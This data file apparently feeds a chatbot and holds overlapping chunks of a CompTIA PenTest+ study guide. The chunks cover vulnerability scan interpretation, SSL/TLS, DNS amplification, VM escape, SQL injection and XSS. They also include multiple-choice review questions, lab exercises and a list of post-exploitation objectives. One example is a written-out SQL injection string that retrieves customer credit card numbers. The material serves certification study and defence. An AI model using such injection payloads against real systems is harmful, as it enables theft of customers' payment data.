rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	persist for many years after they are initially discovered. Cybersecurity analysts discovering a buffer overflow vulnerability during a vulnerability scan should seek out a patch that corrects the issue. In most cases, the scan report will directly identify an available patch. Privilege Escalation Privilege escalation attacks seek to increase the level of access that an attacker has to a target system. They exploit vulnerabilities that allow the transformation of a normal user account into a more privileged account, such as the root superuser account. In October 2016, security researchers announced the discovery of a Linux kernel vulnerability dubbed Dirty COW. This vulnerability, present in the Linux kernel for nine years, was extremely easy to exploit and provided successful attackers with administrative control of affected systems. Rootkits are hacking tools designed to automate privilege escalation attacks. An attacker who gains access to a normal user account may use a rootkit to exploit a vulnerability and perform a privilege escalation attack, seeking to gain administrative privileges. Arbitrary Code Execution Arbitrary code execution vulnerabilities allow an attacker to run software of their choice on the targeted system. This can be a catastrophic event, particularly if the vulnerability allows the attacker to run the code with administrative privileges. Remote code execution vulnerabilities are an even more dangerous subset of code execution vulnerabilities because the attacker can exploit the vulnerability over a network connection without having physical or logical access to the target system. Figure 5.9 shows an example of a remote code execution vulnerability detected by Nessus. FIGURE 5.9 Code execution vulnerability Notice that the CVSS access vector in Figure 5.9 shows that the access vector for this vulnerability is network‐based. This is consistent with the description of a remote code execution vulnerability. The impact metrics in the vector show that the attacker can exploit this vulnerability to completely compromise the system. Fortunately, as with most vulnerabilities detected by scans, there is an easy fix for the problem. Microsoft has issued patches for the versions of Windows affected by the issue. Hardware Flaws Although most vulnerabilities affect operating systems and applications, occasionally vulnerabilities arise that directly affect the underlying hardware running in an organization. These may arise due to firmware issues or, in rarer cases, may be foundational hardware issues requiring remediation. Firmware Vulnerabilities Many hardware devices contain firmware: computer code stored in nonvolatile memory on the device, where it can survive a reboot of the device. Firmware often contains the device's operating system and/or configuration information. Just like any other code, the code contained in firmware may contain security vulnerabilities. In many cases, this code resides out of sight and out of mind for the IT team because it is initially provided by the manufacturer and often lacks both an automatic update mechanism and any integration with enterprise configuration management tools. Cybersecurity analysts should carefully monitor the firmware in use in their organizations and develop an updating procedure that applies security updates as they are released. For penetration testers, firmware vulnerabilities present a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of the device. Firmware often contains the device's operating system and/or configuration information. Just like any other code, the code contained in firmware may contain security vulnerabilities. In many cases, this code resides out of sight and out of mind for the IT team because it is initially provided by the manufacturer and often lacks both an automatic update mechanism and any integration with enterprise configuration management tools. Cybersecurity analysts should carefully monitor the firmware in use in their organizations and develop an updating procedure that applies security updates as they are released. For penetration testers, firmware vulnerabilities present a unique opportunity because they often remain unpatched. A tester may use a firmware vulnerability in a nonstandard computing device to gain a foothold on a network and then pivot to other systems. Point‐of‐Sale System Vulnerabilities The point‐of‐sale (POS) systems found in retail stores, restaurants, and hotels are lucrative targets for attackers and penetration testers alike. These systems often store, process, and/or transmit credit card information, making them highly valuable in the eyes of an attacker seeking financial gain. POS systems typically run either standard or specialized versions of common operating systems, with many running variants of Microsoft Windows. They require the same level of patching and security controls as any other Windows system and are subject to the same security vulnerabilities as those devices. POS systems involved in credit and debit card transactions must comply with the Payment Card Industry Data Security Standard (PCI DSS), which outlines strict, specific rules for the handling of credit card information and the security of devices involved in those transactions. Insecure Protocol Use Many of the older protocols used on networks in the early days of the Internet were designed without security in mind. They often failed to use encryption to protect usernames, passwords, and the content sent over an open network, exposing the users of the protocol to eavesdropping attacks. Telnet is one example of an insecure protocol used to gain command‐line access to a remote server. The File Transfer Protocol (FTP) provides the ability to transfer files between systems but does not incorporate security features. Figure 5.10 shows an example of a scan report that detected a system that supports the insecure FTP protocol. FIGURE 5.10 FTP cleartext authentication vulnerability The solution for this issue is to switch to a more secure protocol. Fortunately, encrypted alternatives exist for both Telnet and FTP. System administrators can use the Secure Shell (SSH) as a secure replacement for Telnet when seeking to gain command‐line access to a remote system. Similarly, the Secure File Transfer Protocol (SFTP) and FTP‐Secure (FTPS) both provide a secure method to transfer files between systems. Debug Modes Many application development platforms support debug modes that give developers crucial information needed to troubleshoot applications in the development process. Debug modes typically provide detailed information on the inner workings of an application and server as well as supporting databases. Although this information can be useful to developers, it can inadvertently assist an attacker
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	System administrators can use the Secure Shell (SSH) as a secure replacement for Telnet when seeking to gain command‐line access to a remote system. Similarly, the Secure File Transfer Protocol (SFTP) and FTP‐Secure (FTPS) both provide a secure method to transfer files between systems. Debug Modes Many application development platforms support debug modes that give developers crucial information needed to troubleshoot applications in the development process. Debug modes typically provide detailed information on the inner workings of an application and server as well as supporting databases. Although this information can be useful to developers, it can inadvertently assist an attacker seeking to gain information about the structure of a database, authentication mechanisms used by an application, or other details. For this reason, vulnerability scans alert on the presence of debug mode on scanned servers. Figure 5.11 shows an example of this type of scan result. FIGURE 5.11 Debug mode vulnerability In this example, the target system appears to be a Windows Server system supporting the ASP.NET development environment. The Output section of the report demonstrates that the server responds when sent a DEBUG request by a client. Solving this issue requires the cooperation of developers and disabling debug modes on systems with public exposure. In mature organizations, software development should always take place in a dedicated development environment that is accessible only from private networks. Developers should be encouraged (or ordered!) to conduct their testing only on systems dedicated to that purpose, and it would be entirely appropriate to enable debug mode on those servers. There should be no need for supporting this capability on public‐facing systems. Network Vulnerabilities Modern interconnected networks use a complex combination of infrastructure components and network appliances to provide widespread access to secure communications capabilities. These networks and their component parts are also susceptible to security vulnerabilities that may be detected during a vulnerability scan. Missing Firmware Updates Operating systems and applications aren't the only devices that require regular security updates. Vulnerability scans may also detect security problems in network devices that require firmware updates from the manufacturer to correct. These vulnerabilities result in reports similar to the operating system missing patch report shown in Figure 5.7 earlier and typically direct administrators to the location on the vendor's site, where the firmware update is available for download. SSL and TLS Issues Transport Layer Security (TLS) offers a secure means to exchange information over the Internet and private networks. Although these protocols can be used to encrypt almost any type of network communication, they are most commonly used to secure connections to web servers and are familiar to end users designated by the S in HTTPS. Secure Sockets Layer (SSL) is an earlier method for performing this same function, but SSL has significant security vulnerabilities and should no longer be used. Many cybersecurity analysts incorrectly use the acronym SSL to refer to both the SSL and TLS protocols. It's important to understand that SSL is no longer secure and should not be used. TLS is a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and private networks. Although these protocols can be used to encrypt almost any type of network communication, they are most commonly used to secure connections to web servers and are familiar to end users designated by the S in HTTPS. Secure Sockets Layer (SSL) is an earlier method for performing this same function, but SSL has significant security vulnerabilities and should no longer be used. Many cybersecurity analysts incorrectly use the acronym SSL to refer to both the SSL and TLS protocols. It's important to understand that SSL is no longer secure and should not be used. TLS is a replacement for SSL that offers similar functionality but does not have the security flaws contained in SSL. Be careful to use this terminology precisely, and to avoid ambiguity, question those who use the term SSL whether they are really referring to TLS. Outdated SSL/TLS Versions SSL is no longer considered secure and should not be used on production systems. The same is true for early versions of TLS. Vulnerability scanners may report that web servers are using these protocols, and cybersecurity analysts should understand that any connections making use of these outdated versions of SSL and TLS may be subject to eavesdropping attacks. Figure 5.12 shows an example of a scan report from a network containing multiple systems that support the outdated SSL version 3. The administrators of servers supporting outdated versions of SSL and TLS should disable support for these older protocols on their servers and support only newer protocols, such as TLS versions 1.2 and 1.3. Insecure Cipher Use SSL and TLS are commonly described as cryptographic algorithms, but in fact, this is not the case. The SSL and TLS protocols describe how cryptographic ciphers may be used to secure network communications, but they are not cryptographic ciphers themselves. Instead, they allow administrators to designate the cryptographic ciphers that can be used with those protocols on a server‐by‐server basis. When a client and server wish to communicate using SSL/TLS, they exchange a list of ciphers that each system supports and agree on a mutually acceptable cipher. FIGURE 5.12 Outdated SSL version vulnerability Some ciphers contain vulnerabilities that render them insecure because of their susceptibility to eavesdropping attacks. For example, Figure 5.13 shows a scan report from a system that supports the insecure RC4 cipher. Solving this common problem requires altering the set of supported ciphers on the affected server and ensuring that only secure ciphers may be used. Certificate Problems SSL and TLS rely on the use of digital certificates to validate the identity of servers and exchange cryptographic keys. Website users are familiar with the error messages displayed in web browsers, such as that shown in Figure 5.14. These errors often contain extremely important information about the security of the site being accessed but, unfortunately, are all too often ignored. Vulnerability scans may also detect issues with the certificates presented by servers that support SSL and/or TLS. Common errors include the following: Mismatch Between the Name on
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	server and ensuring that only secure ciphers may be used. Certificate Problems SSL and TLS rely on the use of digital certificates to validate the identity of servers and exchange cryptographic keys. Website users are familiar with the error messages displayed in web browsers, such as that shown in Figure 5.14. These errors often contain extremely important information about the security of the site being accessed but, unfortunately, are all too often ignored. Vulnerability scans may also detect issues with the certificates presented by servers that support SSL and/or TLS. Common errors include the following: Mismatch Between the Name on the Certificate and the Name of the Server This is a very serious error because it may indicate the use of a certificate taken from another site. It's the digital equivalent of someone using a fake ID “borrowed” from a friend. Expiration of the Digital Certificate Digital certificates have validity periods and expiration dates. When you see an expired certificate, it most likely means that the server administrator failed to renew the certificate in a timely manner. Unknown Certificate Authority (CA) Anyone can create a digital certificate, but digital certificates are only useful if the recipient of a certificate trusts the entity that issued it. Operating systems and browsers contain instructions to trust well‐ known CAs but will show an error if they encounter a certificate issued by an unknown or untrusted CA. FIGURE 5.13 Insecure SSL cipher vulnerability The error shown in Figure 5.15 indicates that the user is attempting to access a website that is presenting an invalid certificate. From the URL bar, we see that the user is attempting to access bankofamerica.com. However, looking in the details section, we see that the certificate being presented was issued to southwestwifi.com. This is a typical occurrence on networks that use a captive portal to authenticate users joining a public wireless network. This example is from the in‐flight Wi‐Fi service offered by Southwest Airlines. The error points out to the user that they are not communicating with the intended website owned by Bank of America and should not provide sensitive information. FIGURE 5.14 Invalid certificate warning FIGURE 5.15 DNS amplification vulnerability Domain Name System (DNS) The Domain Name System (DNS) provides a translation service between domain names and IP addresses. DNS allows end users to remember user‐ friendly domain names, such as apple.com, and not worry about the mind‐ numbing IP addresses actually used by those servers. DNS servers are a common source of vulnerabilities on enterprise networks. Despite the seemingly simple nature of the service, DNS has a track record of many serious security vulnerabilities and requires careful configuration and patching. Many of the issues with DNS services are those already discussed in this chapter, such as buffer overflows, missing patches, and code execution vulnerabilities, but others are specific to the DNS service. Because DNS vulnerabilities are so prevalent, DNS servers are a common first target for attackers and penetration testers alike. Figure 5.15 shows an example of a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	IP addresses actually used by those servers. DNS servers are a common source of vulnerabilities on enterprise networks. Despite the seemingly simple nature of the service, DNS has a track record of many serious security vulnerabilities and requires careful configuration and patching. Many of the issues with DNS services are those already discussed in this chapter, such as buffer overflows, missing patches, and code execution vulnerabilities, but others are specific to the DNS service. Because DNS vulnerabilities are so prevalent, DNS servers are a common first target for attackers and penetration testers alike. Figure 5.15 shows an example of a vulnerability scan that detected a DNS amplification vulnerability on two servers on an organization's network. In this type of attack, the attacker sends spoofed DNS requests to a DNS server that are carefully designed to elicit responses that are much larger in size than the original requests. These large response packets then go to the spoofed address where the DNS server believes the query originated. The IP address used in the spoofed request is actually the target of a denial‐of‐ service attack and is bombarded by very large responses from DNS servers all over the world to queries that it never sent. When conducted in sufficient volume, DNS amplification attacks can completely overwhelm the targeted systems, rendering them inoperable. Internal IP Disclosure IP addresses come in two different variants: public IP addresses, which can be routed over the Internet, and private IP addresses, which can only be used on local networks. Any server that is accessible over the Internet must have a public IP address to allow that access, but the public IP address is typically managed by a firewall that uses the Network Address Translation (NAT) protocol to map the public address to the server's true, private IP address. Systems on the local network can use the server's private address to access it directly, but remote systems should never be aware of that address. Servers that are not properly configured may leak their private IP addresses to remote systems. This can occur when the system includes its own IP address in the header information returned in the response to an HTTP request. The server is not aware that NAT is in use, so it uses the private address in its response. Attackers and penetration testers can use this information to learn more about the internal configuration of a firewalled network. Figure 5.16 shows an example of this type of information disclosure vulnerability. Virtual Private Network Issues Many organizations use virtual private networks (VPNs) to provide employees with secure remote access to the organization's network. As with any application protocol, administrators must ensure that the VPN services offered by the organization are fully patched to current levels. In addition, VPNs require the use of cryptographic ciphers and suffer from similar issues as SSL and TLS when they support the use of insecure ciphers. FIGURE 5.16 Internal IP disclosure vulnerability Virtualization Vulnerabilities Most modern data centers make extensive use of virtualization
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	network. Figure 5.16 shows an example of this type of information disclosure vulnerability. Virtual Private Network Issues Many organizations use virtual private networks (VPNs) to provide employees with secure remote access to the organization's network. As with any application protocol, administrators must ensure that the VPN services offered by the organization are fully patched to current levels. In addition, VPNs require the use of cryptographic ciphers and suffer from similar issues as SSL and TLS when they support the use of insecure ciphers. FIGURE 5.16 Internal IP disclosure vulnerability Virtualization Vulnerabilities Most modern data centers make extensive use of virtualization technology to allow multiple guest systems to share the same underlying hardware. In a virtualized data center, the virtual host hardware runs a special operating system known as a hypervisor that mediates access to the underlying hardware resources. Virtual machines then run on top of this virtual infrastructure provided by the hypervisor, running standard operating systems such as Windows and Linux variants. The virtual machines may not be aware that they are running in a virtualized environment because the hypervisor tricks them into thinking that they have normal access to the underlying hardware when, in reality, that hardware is shared with other systems. Figure 5.17 illustrates how a hypervisor mediates access to the underlying hardware resources in a virtual host to support multiple virtual guest machines. The example described in this chapter, where the hypervisor runs directly on top of physical hardware, is known as bare‐metal virtualization. This is the approach commonly used in data center environments and is also referred to as using a Type 1 hypervisor. There is another type of virtualization, known as hosted virtualization, where a host operating system sits between the hardware and the hypervisor. This is commonly used in cases where the user of an endpoint system wants to run multiple operating systems simultaneously on that device. For example, Parallels is a popular hosted virtualization platform for the Mac. Hosted virtualization is also described as using a Type 2 hypervisor. FIGURE 5.17 Inside a virtual host VM Escape Virtual machine escape vulnerabilities are the most serious issue that may exist in a virtualized environment, particularly when a virtual host runs systems with differing security levels. In an escape attack, the attacker has access to a single virtual host and then manages to leverage that access to intrude on the resources assigned to a different virtual machine. The hypervisor is supposed to prevent this type of intrusion by restricting a virtual machine's access to only those resources assigned to that machine. Escape attacks allow a process running on the virtual machine to “escape” those hypervisor restrictions. Management Interface Access Virtualization engineers use the management interface for a virtual infrastructure to configure the virtualization environment, set up new guest machines, and regulate access to resources. This management interface is extremely sensitive from a security perspective, and access should be tightly controlled to prevent unauthorized individuals from gaining access. In addition to using strong multifactor authentication on
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	virtual machine. The hypervisor is supposed to prevent this type of intrusion by restricting a virtual machine's access to only those resources assigned to that machine. Escape attacks allow a process running on the virtual machine to “escape” those hypervisor restrictions. Management Interface Access Virtualization engineers use the management interface for a virtual infrastructure to configure the virtualization environment, set up new guest machines, and regulate access to resources. This management interface is extremely sensitive from a security perspective, and access should be tightly controlled to prevent unauthorized individuals from gaining access. In addition to using strong multifactor authentication on the management interface, cybersecurity professionals should ensure that the interface is never directly accessible from a public network. Vulnerability scans that detect the presence of an accessible management interface will report this as a security concern. Virtual Host Patching This chapter has already discussed the importance of promptly applying security updates to operating systems, applications, and network devices. It is equally important to ensure that virtualization platforms receive security updates that may affect the security of virtual guests or the entire platform. Patches may correct vulnerabilities that allow virtual machine escape attacks or other serious security flaws. Virtual Guest Issues Cybersecurity analysts should think of each guest machine running in a virtualized environment as a separate server that requires the same security attention as any other device on the network. Guest operating systems and applications running on the guest OS must be promptly patched to correct security vulnerabilities and be otherwise well maintained. There's no difference from a security perspective between a physical server and a virtualized server. Virtual Network Issues As data centers become increasingly virtualized, a significant amount of network traffic never actually touches a network. Communications between virtual machines that reside on the same physical hardware can occur in memory without ever touching a physical network. For this reason, virtual networks must be maintained with the same attention to security that administrators would apply to physical networks. This includes the use of virtual firewalls to control the flow of information between systems and the isolation of systems of differing security levels on different virtual network segments. Internet of Things (IoT) In some environments, cybersecurity analysts may encounter the use of supervisory control and data acquisition (SCADA) systems, industrial control systems (ICSs), and other examples of the Internet of Things (IoT). These systems allow the connection of physical devices and processes to networks and provide tremendous sources of data for organizations seeking to make their business processes more efficient and effective. However, they also introduce new security concerns that may arise on vulnerability scans. As with any other device on a network, IoT devices may have security vulnerabilities and are subject to network‐based attacks. However, it is often more difficult to patch IoT devices than it is to patch their traditional server counterparts because it is difficult to obtain patches. IoT device manufacturers may not use automatic update mechanisms, and the only way that cybersecurity analysts may become
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	devices and processes to networks and provide tremendous sources of data for organizations seeking to make their business processes more efficient and effective. However, they also introduce new security concerns that may arise on vulnerability scans. As with any other device on a network, IoT devices may have security vulnerabilities and are subject to network‐based attacks. However, it is often more difficult to patch IoT devices than it is to patch their traditional server counterparts because it is difficult to obtain patches. IoT device manufacturers may not use automatic update mechanisms, and the only way that cybersecurity analysts may become aware of an update is through a vulnerability scan or by proactively subscribing to the security bulletins issued by IoT device manufacturers. IoT devices also often have unique characteristics compared to other devices attached to the networks. They often exist as embedded systems, where there is an operating system and computer running in the device that may not be obvious or accessible to the outside world. For example, large multifunction copier/printer units found in office environments often have an entire Windows or Linux operating system running internally that may act as a file and print server. IoT devices also often run real‐time operating systems (RTOSs). These are either special‐purpose operating systems or variants of standard operating systems designed to process data rapidly as it arrives from sensors or other IoT components. Web Application Vulnerabilities Web applications are complex environments that often rely not only on web servers but also on back‐end databases, authentication servers, and other components to provide services to end users. These web applications may also contain security holes that allow attackers to gain a foothold on a network, and modern vulnerability scanners are able to probe web applications for these vulnerabilities. Injection Attacks Injection attacks occur when an attacker is able to send commands through a web server to a back‐end system, bypassing normal security controls and fooling the back‐end system into believing that the request came from the web server. The most common form of this attack is the SQL injection attack, which exploits web applications to send unauthorized commands to a back‐end database server. Web applications often receive input from users and use it to compose a database query that provides results that are sent back to a user. For example, consider the search function on an e‐commerce site. If a user enters orange tiger pillows in the search box, the web server needs to know what products in the catalog might match this search term. It might send a request to the back‐end database server that looks something like this: SELECT ItemName, ItemDescription, ItemPrice FROM Products WHERE ItemName LIKE '%orange%' AND ItemName LIKE '%tiger%' AND ItemName LIKE '%pillow%' This command retrieves a list of items that can be included in the results returned to the end user. In a SQL injection attack, the attacker might send a very unusual‐looking request to the web server, perhaps searching for: orange tiger pillow'; SELECT CustomerName, CreditCardNumber FROM
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	pillows in the search box, the web server needs to know what products in the catalog might match this search term. It might send a request to the back‐end database server that looks something like this: SELECT ItemName, ItemDescription, ItemPrice FROM Products WHERE ItemName LIKE '%orange%' AND ItemName LIKE '%tiger%' AND ItemName LIKE '%pillow%' This command retrieves a list of items that can be included in the results returned to the end user. In a SQL injection attack, the attacker might send a very unusual‐looking request to the web server, perhaps searching for: orange tiger pillow'; SELECT CustomerName, CreditCardNumber FROM Orders; -- If the web server simply passes this request along to the database server, it would do this (with a little reformatting for ease of viewing): SELECT ItemName, ItemDescription, ItemPrice FROM Products WHERE ItemName LIKE '%orange%' AND ItemName LIKE '%tiger%' AND ItemName LIKE '%pillow'; SELECT CustomerName, CreditCardNumber FROM Orders; ––%' This command, if successful, would run two SQL queries (separated by the semicolon). The first would retrieve the product information, and the second would retrieve a listing of customer names and credit card numbers. The two best ways to protect against SQL injection attacks are input validation and the enforcement of least privilege restrictions on database access. Input validation ensures that users don't provide unexpected text to the web server. It would block the use of the apostrophe that is needed to “break out” of the original SQL query. Least privilege restricts the tables that may be accessed by a web server and can prevent the retrieval of credit card information by a process designed to handle catalog information requests. Vulnerability scanners can detect injection vulnerabilities, such as the one shown in Figure 5.18. When cybersecurity analysts notice a potential injection vulnerability, they should work closely with developers to validate that the vulnerability exists and fix the affected code. FIGURE 5.18 SQL injection vulnerability Cross‐Site Scripting In a cross‐site scripting (XSS) attack, an attacker embeds scripting commands on a website that will later be executed by an unsuspecting visitor accessing the site. The idea is to trick a user visiting a trusted site into executing malicious code placed there by an untrusted third party. Figure 5.19 shows an example of an XSS vulnerability detected during a Nessus vulnerability scan. FIGURE 5.19 Cross‐site scripting vulnerability Cybersecurity analysts discovering potential XSS vulnerabilities during a scan should work with developers to assess the validity of the result and implement appropriate controls to prevent this type of attack, such as implementing input validation. Summary Vulnerability scanners produce a significant amount of data that can inform penetration tests. Penetration testers must be familiar with the interpretation of vulnerability scan results and the prioritization of vulnerabilities as attack targets to improve the efficiency and effectiveness of their testing efforts. Vulnerability scanners usually rank detected issues using the Common Vulnerability Scoring System (CVSS). CVSS provides a set of base score metrics that provide a look at the potential that a vulnerability will be successfully exploited and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the validity of the result and implement appropriate controls to prevent this type of attack, such as implementing input validation. Summary Vulnerability scanners produce a significant amount of data that can inform penetration tests. Penetration testers must be familiar with the interpretation of vulnerability scan results and the prioritization of vulnerabilities as attack targets to improve the efficiency and effectiveness of their testing efforts. Vulnerability scanners usually rank detected issues using the Common Vulnerability Scoring System (CVSS). CVSS provides a set of base score metrics that provide a look at the potential that a vulnerability will be successfully exploited and the impact it could have on the organization. As penetration testers interpret scan results, they should be careful to watch for common issues. False positive reports occur when the scanner erroneously reports a vulnerability that does not actually exist. These may present false leads that waste testing time, in the best case, or alert administrators to penetration testing activity, in the worst case. To successfully interpret vulnerability reports, penetration testers must be familiar with the vulnerabilities that commonly occur. Common server and endpoint vulnerabilities include missing patches, unsupported operating systems and applications, buffer overflows, privilege escalation, arbitrary code execution, insecure protocol usage, and the presence of debugging modes. Common network vulnerabilities include missing firmware updates, SSL/TLS issues, DNS misconfigurations, internal IP disclosures, and VPN issues. Virtualization vulnerabilities include virtual machine escape vulnerabilities, management interface access, missing patches on virtual hosts, and security misconfigurations on virtual guests and virtual networks. Exam Essentials Be able to explain how vulnerability scan reports provide critical information to penetration testers. In addition to providing details about the vulnerabilities present on a system, vulnerability scan reports also offer crucial severity and exploitation information. The report typically includes the request and response that triggered a vulnerability report as well as a suggested solution to the problem. Know the purpose of the Common Vulnerability Scoring System (CVSS). The CVSS base score computes a standard measure on a 10‐point scale that incorporates information about the attack vector required to exploit a vulnerability, the complexity of the exploit, the attack requirements, the privileges required, and the level of user interaction required to execute an attack. The base score also considers the impact of the vulnerability on the confidentiality, integrity, and availability of the vulnerable system and subsequent systems. Understand the different results possible from a vulnerability scan. When a scan correctly reports that a vulnerability exists, that is known as a true positive report. When a scan detects a vulnerability that does not exist, this is a false positive report. When a scan correctly reports that a vulnerability does not exist, that is known as a true negative report. When a scan does not report a vulnerability but one does exist, that is a false negative report. Be able to name common sources of vulnerability. Missing patches and outdated operating systems are two of the most common vulnerability sources and are easily corrected by proactive device maintenance. Buffer overflow, privilege
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	correctly reports that a vulnerability exists, that is known as a true positive report. When a scan detects a vulnerability that does not exist, this is a false positive report. When a scan correctly reports that a vulnerability does not exist, that is known as a true negative report. When a scan does not report a vulnerability but one does exist, that is a false negative report. Be able to name common sources of vulnerability. Missing patches and outdated operating systems are two of the most common vulnerability sources and are easily corrected by proactive device maintenance. Buffer overflow, privilege escalation, and arbitrary code execution attacks typically exploit application flaws. Devices supporting insecure protocols are also a common source of vulnerabilities. Know that network devices should receive regular firmware updates. Network administrators should ensure that network devices receive regular firmware updates to patch security issues. Improper implementations of SSL and TLS encryption also cause vulnerabilities when they use outdated protocols, insecure ciphers, or invalid certificates. Be able to explain how virtualized infrastructures add another layer of potential vulnerability. Administrators responsible for virtualized infrastructure must take extra care to ensure that the hypervisor is patched and protected against virtual machine escape attacks. Additionally, administrators should carefully restrict access to the virtual infrastructure's management interface to prevent unauthorized access attempts. Lab Exercises Activity 5.1: Interpreting a Vulnerability Scan In Activity 4.2, you ran a vulnerability scan of a network under your control. In this lab, you will interpret the results of that vulnerability scan. Review the scan results carefully and develop a plan for the next phase of your penetration test. What vulnerabilities that you discovered seem the most promising targets for exploitation? Why? How would you approach exploiting those vulnerabilities? Activity 5.2: Analyzing a CVSS Vector In this lab, you will interpret a CVSS vector to assess the severity and impact of a vulnerability. The vector is: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N Explain the components of the CVSS vector for this vulnerability. Activity 5.3: Developing a Penetration Testing Plan In the scenario at the beginning of this chapter, you read about two vulnerabilities discovered in a web server operated by MCDS, LLC. In this lab, you will develop a penetration testing plan that exploits those vulnerabilities. 1. Review each of the vulnerabilities identified in the scenario. 2. Assess the significance of each vulnerability for use during a penetration test. 3. Identify how you might exploit each vulnerability and what you might hope to achieve by exploiting the vulnerability. Review Questions You can find the answers in the Appendix A. 1. Tom is reviewing a vulnerability scan report and finds that one of the servers on his network suffers from an internal IP address disclosure vulnerability. What protocol is likely in use on this network that resulted in this vulnerability? A. TLS B. NAT C. SSH D. VPN 2. Which one of the CVSS metrics would contain information about the type of user account an attacker must use to execute an attack? A. AV B. VC
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	each vulnerability and what you might hope to achieve by exploiting the vulnerability. Review Questions You can find the answers in the Appendix A. 1. Tom is reviewing a vulnerability scan report and finds that one of the servers on his network suffers from an internal IP address disclosure vulnerability. What protocol is likely in use on this network that resulted in this vulnerability? A. TLS B. NAT C. SSH D. VPN 2. Which one of the CVSS metrics would contain information about the type of user account an attacker must use to execute an attack? A. AV B. VC C. PR D. AC 3. Which one of the following values for the CVSS attack complexity metric would indicate that the specified attack is simplest to exploit? A. High B. Medium C. Low D. Severe 4. Which one of the following values for the confidentiality, integrity, or availability CVSS metric would indicate the potential for total compromise of a system? A. N B. A C. H D. L 5. What is the most recent version of CVSS that is currently available? A. 2.0 B. 3.0 C. 3.1 D. 4.0 6. Which one of the following metrics is not included in the calculation of the CVSS exploitability score? A. Attack vector B. Vulnerability age C. Attack complexity D. Privileges required 7. Kevin recently identified a new security vulnerability and computed its CVSS base score as 6.5. Which risk category would this vulnerability fall into? A. Low B. Medium C. High D. Critical 8. Tara recently analyzed the results of a vulnerability scan report and found that a vulnerability reported by the scanner did not exist because the system was actually patched as specified. What type of error occurred? A. False positive B. False negative C. True positive D. True negative 9. Which one of the following is not a common source of information that may be correlated with vulnerability scan results? A. Logs B. Database tables C. SIEM D. Configuration management system 10. Which one of the following characteristics is not required to consider a scan complete? A. All network segments have been covered. B. The scan had sufficient privileges. C. All user accounts were covered. D. All applications were covered. 11. In what type of attack does the attacker place more information in a memory location than is allocated for that use? A. SQL injection B. LDAP injection C. Cross‐site scripting D. Buffer overflow 12. You are reading a scan report about a new vulnerability that inserts more data than is allowed into a memory location. What term best describes this attack? A. Malicious code B. Privilege escalation C. Buffer overflow D. LDAP injection 13. Which one of the following protocols should never be used on a public network? A. SSH B. HTTPS C. SFTP D. Telnet 14. Betty is selecting a transport encryption protocol for use in a new public website she is creating. Which protocol would be the best choice? A. SSL 2.0 B. SSL 3.0 C. TLS
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scripting D. Buffer overflow 12. You are reading a scan report about a new vulnerability that inserts more data than is allowed into a memory location. What term best describes this attack? A. Malicious code B. Privilege escalation C. Buffer overflow D. LDAP injection 13. Which one of the following protocols should never be used on a public network? A. SSH B. HTTPS C. SFTP D. Telnet 14. Betty is selecting a transport encryption protocol for use in a new public website she is creating. Which protocol would be the best choice? A. SSL 2.0 B. SSL 3.0 C. TLS 1.0 D. TLS 1.3 15. Which one of the following conditions would not result in a certificate warning during a vulnerability scan of a web server? A. Use of an untrusted CA B. Inclusion of a public encryption key C. Expiration of the certificate D. Mismatch in certificate name 16. What software component is responsible for enforcing the separation of guest systems in a virtualized infrastructure? A. Guest operating system B. Host operating system C. Memory controller D. Hypervisor 17. In what type of attack does the attacker seek to gain access to resources assigned to a different virtual machine? A. VM escape B. Management interface brute force C. LDAP injection D. DNS amplification 18. Which one of the following terms is not typically used to describe the connection of physical devices to a network? A. IoT B. IDS C. ICS D. SCADA 19. Monica discovers that an attacker posted a message attacking users who visit a web forum that she manages. Which one of the following attack types is most likely to have occurred? A. SQL injection B. Malware injection C. LDAP injection D. Cross‐site scripting 20. Alan is reviewing web server logs after an attack and finds many records that contain semicolons and apostrophes in queries from end users. What type of attack should he suspect? A. SQL injection B. LDAP injection C. Cross‐site scripting D. Buffer overflow Chapter 6 Exploit and Pivot THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3.0 Vulnerability Discovery and Analysis 3.1 Given a scenario, conduct vulnerability discovery using various techniques. TruffleHog BloodHound PowerSploit Domain 5.0 Post‐exploitation and Lateral Movement 5.1 Given a scenario, perform tasks to establish and maintain persistence. Scheduled tasks/cron jobs Service creation Reverse shell Bind shell Add new accounts Obtain valid account credentials Registry keys Command and control (C2) frameworks Backdoor Web shell Trojan Rootkit Browser extensions Tampering security controls 5.2 Given a scenario, perform tasks to move laterally throughout the environment. Pivoting Relay creation Enumeration Service discovery Network traffic discovery Additional credential capture Credential dumping String searches Service discovery Server Message Block (SMB)/ Fileshares Remote Desktop Protocol (RDP)/ Virtual Network Computing (VNC) Secure Shell (SSH) Cleartext LDAP Remote Procedure Call (RPC) File Transfer Protocol (FTP) Telnet Hypertext Transfer Protocol (HTTP)/ Hypertext Transfer Protocol Secure (HTTPS) Web interfaces Line Printer Daemon (LPD) JetDirect RPC/Distributed Component Object Model (DCOM) Process IDs Window Management Instrumentation (WMI) Tools LOLBins
